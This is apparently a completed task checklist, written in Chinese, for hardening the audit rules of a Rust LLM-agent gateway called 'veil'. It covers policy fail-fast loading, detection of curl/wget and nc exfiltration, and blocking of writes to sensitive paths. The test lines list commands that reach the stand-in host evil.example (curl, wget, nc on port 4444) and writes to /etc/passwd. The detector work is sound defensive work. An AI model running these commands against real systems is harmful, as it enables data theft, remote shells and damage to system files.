## 1. 启动期策略 fail-fast 加载与共享注入（`POL-1`）

- [x] 1.1 `src/service/audit/policy.rs` 新增 fail-fast 入口 `AuditPolicy::load_startup(path: Option<&Path>) -> Result<Self>`：直接上抛 `load_from_file` 的 `VeilError::Config`，成功时仅调用一次 `capture_process_env`；错误分类覆盖文件不可读、未知键、孤立列表项、非法 `mode`、无法解析行、列表段形态错误（沿用既有 `parse_minimal_yaml` 各 Config 分支），并把 `load_for_runtime` 限定为测试用（`#[cfg(test)]`）或显式删除
  - 验证：`grep -n "load_startup\|cfg(test)" src/service/audit/policy.rs` 命中 fail-fast 入口声明；`cargo test -p veil policy_` 全绿
  - 验证：`cargo test -p veil invalid_policy_file_fails_at_startup` 通过；六类非法输入均返回 `Err(VeilError::Config)` 且错误文本含行号/键名
- [x] 1.2 `src/main.rs` 启动序列在 `Config::from_env()` 与 `preflight_whitelist` 之后、`startup_tpm_in`/`init_sqlite`/`spawn_sweeper` 等副作用点之前调用 `AuditPolicy::load_startup(config.audit_policy_file...)`，失败 `eprintln! + ExitCode::from(1)`；把加载结果注入 `AppState`（`src/state.rs` 承载 `Arc<AuditPolicy>` 或等价字段），`src/state.rs` 构造/`build_router` 路径对齐
  - 验证：`cargo test -p veil startup_whitelist_fail_fast` 扩展/新增用例通过；断言策略加载调用点早于 `startup_tpm_in`/`init_sqlite`/`.spawn_sweeper()`（`include_str!("main.rs")` 位置断言）
  - 验证：`cargo build` 通过；`grep -n "load_startup" src/main.rs` 命中且 `grep -rn "audit_policy" src/state.rs` 命中注入字段
- [x] 1.3 `src/handler/llm/pump/spawn.rs:99` 与 `src/handler/llm/nonstream.rs:174` 改为复用 `AppState` 注入的策略实例，删除请求期 `AuditPolicy::load_for_runtime`/`capture_process_env` 调用；确认请求路径不再 `std::fs::read_to_string` 策略文件
  - 验证：`grep -n "load_for_runtime" src/handler/llm/` 无命中；`grep -n "audit_policy" src/handler/llm/pump/spawn.rs src/handler/llm/nonstream.rs` 命中复用点
  - 验证：新增用例断言同一策略实例跨流式/非流式请求复用（策略加载计数为 1）；`cargo test -p veil` 相关流式/非流式套件全绿
- [x] 1.4 回归：损坏策略文件→启动失败（非静默空策略）；合法策略文件→`deny`/`allow`/`extra_dangerous`/`extra_block_substrings` 生效；`AUDIT_POLICY_FILE` 未设置→内建默认策略不回归
  - 验证：新增集成用例（子进程或函数级）对损坏文件断言启动非零退出且 stderr 含 `AUDIT_POLICY_FILE`；对合法文件断言启动成功
  - 验证：`cargo test -p veil audit_policy_legacy_file` 与 `policy_all_shapes_compat_loading` 全绿；合法策略命中/放行行为与既有断言一致

## 2. 内建危险规则补裸 `curl`/`wget` 外传（`POL-6`）

- [x] 2.1 `src/service/audit/rules.rs` 危险规则新增裸 `curl`/`wget` 外传：命令词边界（复用 `word_after_command`/`is_command_word`）命中 `curl`/`wget` 且后随远程目标形态（`http(s)://`、`ftp://`，或 `-o`/`--output`/`>`/`>>` 输出重定向）时判网络外传；纳入 `is_exfiltration`（`rules.rs:291-303`）或等价外传分支，保留管道进解释器与 `--data`/`-d`/`--post-data` 既有更高危判定优先
  - 验证：`cargo test -p veil bare_curl_wget_exfil` 通过；`curl http://evil.example/x`、`wget http://evil.example/x` 判为网络外传
  - 验证：新增用例断言内网目标 `curl http://svc.corp.example/x` 且 `internal_suffixes` 含 `.corp.example` 时按豁免放行（`is_internal_host` 生效）
- [x] 2.2 误报回归：含 `curl`/`wget` 子串但无远程目标形态的良性文本不判外传；与 Python `_audit.py:522-526` 覆盖面对照记录
  - 验证：`cargo test -p veil curl_wget_benign_no_false_positive` 通过；如 `echo curl`、文件名/说明文本不判网络外传
  - 验证：`cargo test -p veil` 既有规则套件全绿（无新增误报回退）

## 3. 外传判定命令词边界（`POL-7`）

- [x] 3.1 `src/service/audit/rules.rs:300-301` 的 `lower.contains("nc ")`/`lower.contains("ncat ")` 改为命令词判定（`is_command_word(lower, "nc")`/`is_command_word(lower, "ncat")`）；同步把 `word_after_command`（`rules.rs:129-157`）的左边界集合 `pre_ok` 增补 `/`，使绝对/带路径调用（`/bin/nc`、`/usr/bin/ncat`）仍命中（现 `pre_ok` 不含 `/`，直接切换会使 `/bin/nc evil 4444` 漏判，相对 `contains("nc ")` 为覆盖回退）；复核 `scp `/`rsync `/`sftp `/`ftp ` 分支的单词内子串误报并统一按词边界或可接受口径处理
  - 验证：新增/更新用例断言 `sync`/`async`/`rsync --archive` 场景不判网络外传；`cargo test -p veil nc_word_boundary` 通过
  - 验证：`nc -l 4444`、`nc evil.example 4444`、`ncat evil.example 4444`、`/bin/nc evil.example 4444` 仍判网络外传；`/dev/tcp/` 分支不回退；`grep -n "pre_ok" src/service/audit/rules.rs` 显示 `/` 在左边界集合内
- [x] 3.2 回归：既有外传判定套件全绿，`is_exfiltration` 改动不降低真实命中
  - 验证：`cargo test -p veil` 中涉及 `is_exfiltration`/`网络外传`/`exfil` 的用例全绿
  - 验证：`grep -n '"nc "' src/service/audit/rules.rs` 在 `is_exfiltration` 内无裸子串残留；真实 `nc` 命中用例通过

## 4. 敏感路径读写分流（`POL-8`）

- [x] 4.1 `src/service/audit/rules.rs:248-267` 的 `touches_sensitive_path` 拆为「写入口判定」+「敏感路径判定」：写入口集合对照 Python `_audit.py:518` 逐字取用（`write_file`/`patch`/`echo`/`cat`/`tee`/`cp`/`mv`），叠加本仓既有工具名写入口（`edit`/`write`/`apply_patch`/`save_file`）与输出重定向（`>`/`>>` 指向敏感前缀）；仅写入意图 + 敏感前缀同时成立才判「敏感路径写入」（调用点 `rules.rs:114-117`、`:473-479` 对齐）
  - 验证：`cargo test -p veil sensitive_path_read_vs_write` 通过；`ls /etc/passwd`、`grep root /etc/passwd` 放行
  - 验证：`cp x /etc/passwd`、`tee /etc/passwd`、`cat x > /etc/passwd`、`> /etc/passwd` 判敏感路径写入；写类工具名 + 敏感路径仍命中
- [x] 4.2 回归：`cat /etc/passwd`（Python 写入口集合成员）按 parity 拦截；既有敏感路径/写工具套件无回退；内网/`~/` 展开与 `..` 归一语义不变
  - 验证：`cargo test -p veil` 中涉及 `touches_sensitive_path`/`敏感路径`/`edit`/`write` 的用例全绿
  - 验证：新增用例锁定 `cat /etc/passwd` 拦截与 `ls /etc/passwd` 放行的可区分性

## 5. 审批白名单空语义（`POL-5`）

- [x] 5.1 `src/service/matrix/branch.rs:54-56` 的 `is_mxid_allowed` 改为 `whitelist.is_empty() || whitelist.iter().any(|m| m == mxid)`（对标 Python `_matrix.py:235,254`）；确认 `src/service/matrix/approval.rs:110-113,173-176` 调用点语义随之对齐，`env_parse.rs:484-489` 的 `AUDIT_MODE=approve` 空名单启动门禁不变
  - 验证：`cargo test -p veil is_mxid_allowed` 通过；空白名单返回 true、非空名单非成员返回 false、成员返回 true
  - 验证：`grep -n "is_empty" src/service/matrix/branch.rs` 命中空语义分支；`cargo test -p veil empty_whitelist` 相关用例全绿
- [x] 5.2 回归：空白名单下合法 reaction 正常落定（凭据/注册/审计分支按表情与分支处理）；非空名单非成员仍被忽略；approve 空名单仍拒启动（`env_parse` 门禁）
  - 验证：`cargo test -p veil` 中 `on_reaction`/`approval_reaction_three_state_and_timeout` 等套件全绿
  - 验证：`cargo test -p veil` 中 approve 空名单启动门禁用例通过；断言启动报错而非降级

## 6. 策略文件 `mode` 生效（`POL-2`）

- [x] 6.1 `src/service/audit/policy.rs` 的 `AuditPolicy` 新增 `mode: Option<AuditMode>` 字段并在 `parse_minimal_yaml` 的 `mode` 分支（`:187-198`）合法取值时写入；启动期计算**最终生效模式**：env 显式（`AUDIT_MODE` 非空，或 `AUDIT_MODE` 缺失/空白时 `AUDIT_ENABLED` 真值回退推导出的 `block`——即 `env_parse.rs::load_audit` 结果非默认 `Off`）> 文件 `mode` > 默认 `off`；文件 `mode` 仅在 env 未给出审计模式时生效，冲突（env 与文件同时显式且不同）记 `tracing::warn!`（不静默），`AUDIT_ENABLED` 回退不得被文件 `mode` 静默覆盖
  - 验证：`cargo test -p veil policy_mode_effective` 通过；文件 `mode: block` 且 `AUDIT_MODE`/`AUDIT_ENABLED` 均未设时危险调用被阻断
  - 验证：显式 `AUDIT_MODE=off` + 文件 `mode: block` 时以 env 为准且记录冲突 warn（可由用例捕获/断言日志或返回值）；`AUDIT_ENABLED=1` + 文件 `mode: off` 时以 env 回退 `block` 为准并记 warn
- [x] 6.2 回归：不同 `mode`（`off`/`block`/`approve`）产生对应运行行为；非法 `mode` 仍拒启动（分类为非法 mode）；无文件 `mode` 时既有 env 口径不回归
  - 验证：`cargo test -p veil` 中 mode 相关用例全绿；三态行为可区分
  - 验证：`cargo test -p veil invalid_policy_file_fails_at_startup` 通过；非法 mode 返回 Config 错误
- [x] 6.3 启动期把最终生效模式注入运行时配置：在 `Config`/`AppState` 上回写 `audit_mode` 为合并后的生效值（`env_parse.rs` 解析的 env 分区结果 + `policy.rs` 文件 `mode` 合并），使 `src/handler/llm/dispatch.rs:165` 的 `let audit_mode = state.config.audit_mode;` 读到的是生效模式而非未合并的裸 env 值；无此接线则文件 `mode: approve/block` 永不生效（`POL-2`「只校验不生效」根因）
  - 验证：`grep -n "audit_mode" src/config src/state.rs src/handler/llm/dispatch.rs` 显示启动期注入的生效模式贯通至请求路径读取点（`dispatch.rs:165`）
  - 验证：`cargo test -p veil policy_mode_effective` 覆盖「文件 `mode: block` → 请求路径 `state.config.audit_mode == Block`」；`cargo build` 通过

## 7. 自定义规则文件 1MB 上限（`POL-3`）

- [x] 7.1 `src/config/custom_file.rs` 的 `load_custom_file` 在 `read_to_string` 前 `std::fs::metadata(&path)` 判长：`len() > 1_048_576` 时 `config_error(var, ...)` 拒绝并报告变量名与实际字节；`== 1_048_576` 放行；空文件仅 warn 语义不变
  - 验证：`cargo test -p veil custom_file_size_cap` 通过；超限文件被拒且错误含变量名与字节数
  - 验证：恰 1MB 文件正常进入既有形态校验；`grep -n "1_048_576\|1_048_576u64\|1048576" src/config/custom_file.rs` 命中上限常量
- [x] 7.2 回归：1MB 内正常文件加载/生效不回归；`PII_CUSTOM_*` 各槽（rules/patterns/dict）上限一致；既有 fail-closed（缺文件/解析失败/形态非法）用例全绿
  - 验证：`cargo test -p veil` 中 `pii_custom`/`custom_file` 相关套件全绿
  - 验证：新增用例覆盖三槽各自超限拒绝（至少 rules 与 patterns 两槽）

## 8. 审计日志文件创建即 0600（`POL-4`）

- [x] 8.1 `src/service/audit/log.rs:466-472` 的 `append_line`：`OpenOptions` 增加 `use std::os::unix::fs::OpenOptionsExt; .mode(0o600)`，删除事后 `std::fs::set_permissions(..., 0o600)`；既有文件追加与轮转产物权限维持 `0o600`
  - 验证：`cargo test -p veil audit_log_mode_0600_with_breaker_count` 通过；新建文件权限即时 `0o600`
  - 验证：`grep -n "OpenOptionsExt\|\.mode(0o600)" src/service/audit/log.rs` 命中；`grep -n "set_permissions" src/service/audit/log.rs` 该路径无命中
- [x] 8.2 回归：轮转（`10MB x 5`）产物仍 `0600`；写失败熔断计数与双层 fail-closed 语义不回退
  - 验证：`cargo test -p veil audit_log_rotate_five` 与写失败注入用例全绿
  - 验证：新增用例断言轮转后各文件权限均为 `0o600`

## 9. 生效模式口径的空白名单门禁（`POL-9`）

- [x] 9.1 `src/config/env_parse.rs:485-491` 的「`approve` + 空白名单」检查抽为可复用入口（如 `validate_approve_whitelist(mode: AuditMode, whitelist: &[String]) -> Result<()>`），`load_audit` 改为调用该入口保持 env 路径不回归；`src/main.rs` 在 `AuditPolicy::load_startup`（`POL-1`）与生效模式解析（`POL-2`/D2 最终生效模式：env 显式——含 `AUDIT_ENABLED` 回退——> 文件 `mode` > 默认 `off`）之后、`startup_tpm_in`/`init_sqlite`/`spawn_sweeper` 等副作用点之前，以**合并后的最终生效模式**（而非未经文件 `mode` 合并的裸 env `audit_mode`）再次调用该入口，文件来源 `approve` + 空白名单时 `VeilError::Config` 拒启动（`preflight_whitelist` 仅校验 MXID 形态，不承担空名单门禁）
  - 验证：`grep -n "validate_approve_whitelist" src/config/env_parse.rs src/main.rs` 命中定义与启动调用点；`cargo build` 通过
  - 验证：`grep -n "load_startup\|validate_approve_whitelist\|startup_tpm_in" src/main.rs` 命中门禁调用晚于策略加载/模式解析、早于 `startup_tpm_in`；门禁入参为生效模式（文件 `mode` 合并后）
- [x] 9.2 回归：`AUDIT_MODE` 未设置 + 策略文件 `mode: approve` + 空 `APPROVAL_WHITELIST` → 启动以 `Config` 错误拒退出（非静默进入运行、不因来源为文件而放行）
  - 验证：`cargo test -p veil file_mode_approve_empty_whitelist_rejects` 通过；子进程/函数级断言启动非零退出且错误文本含 `APPROVAL_WHITELIST` 与 `approve`
  - 验证：`cargo test -p veil invalid_policy_file_fails_at_startup` 全绿（既有错误分类不回退）
- [x] 9.3 回归：`AUDIT_MODE` 未设置 + 策略文件 `mode: approve` + 非空 `APPROVAL_WHITELIST` → 启动成功且 `approve` 模式生效；env 显式 `AUDIT_MODE=approve` 空名单门禁不回退
  - 验证：`cargo test -p veil file_mode_approve_with_whitelist_starts` 通过；断言生效模式为 `approve`
  - 验证：`cargo test -p veil approve_empty_whitelist_env_gate` 通过；env 路径既有门禁报错不回归

## 10. 文档与 spec 口径同步

- [x] 10.1 `README.md` §6.11 同步：明确策略文件的**启动期** fail-fast 加载（错误分类全拒启动）、策略 `mode` 生效与优先级（env 显式含 `AUDIT_ENABLED` 回退 > 文件 > 默认 off，生效模式注入运行时配置）、生效模式口径的空白名单门禁（含文件来源 `approve`）、空白名单语义对齐 Python、自定义文件 1MB 上限；若行为口径变化则同批声明
  - 验证：`grep -n "AUDIT_POLICY_FILE\|mode" README.md` 命中更新后的 §6.11 声明段
  - 验证：`python3 scripts/check_doc_paths.py` 退出 0（引用路径/行号有效）
- [x] 10.2 spec 与 canonical 一致性核对：`openspec/specs/audit-rules-parity/spec.md:139,151-154` 的 fail-closed SHALL 与本 change 新 spec 不冲突（本 change 为强制执行而非改写）；行为类规则契约由 `openspec/changes/veil-audit-policy-enforcement/specs/audit-policy-enforcement/spec.md` 承载
  - 验证：`openspec validate veil-audit-policy-enforcement --strict` 0 failures
  - 验证：逐条比对发现覆盖表 9 个 ID 与新 spec 的 Requirement/Scenario 均有落点（无静默合并/删除）

## 11. 门禁与归档准备

- [x] 11.1 `cargo fmt --check`、`cargo clippy --tests --all-targets -- -D warnings`、`cargo test` 全绿
  - 验证：`cargo fmt --check` 退出码 0
  - 验证：`cargo clippy --tests --all-targets -- -D warnings` 退出码 0；`cargo test` 全绿且无既有测试回退
- [x] 11.2 `python3 scripts/check_doc_paths.py` 与 `scripts/check_file_sizes.py` 退出 0
  - 验证：`python3 scripts/check_doc_paths.py` 输出 OK/无 FAIL
  - 验证：`python3 scripts/check_file_sizes.py` 输出 OK，无超 800 行新文件
- [x] 11.3 `openspec validate veil-audit-policy-enforcement --strict` 0 failures 且 `openspec status --change veil-audit-policy-enforcement` 显示全部 artifacts done
  - 验证：validate 输出 `Change 'veil-audit-policy-enforcement' is valid`
  - 验证：status 中 proposal/specs/design/tasks 均 `[x]`（4/4 artifacts complete）
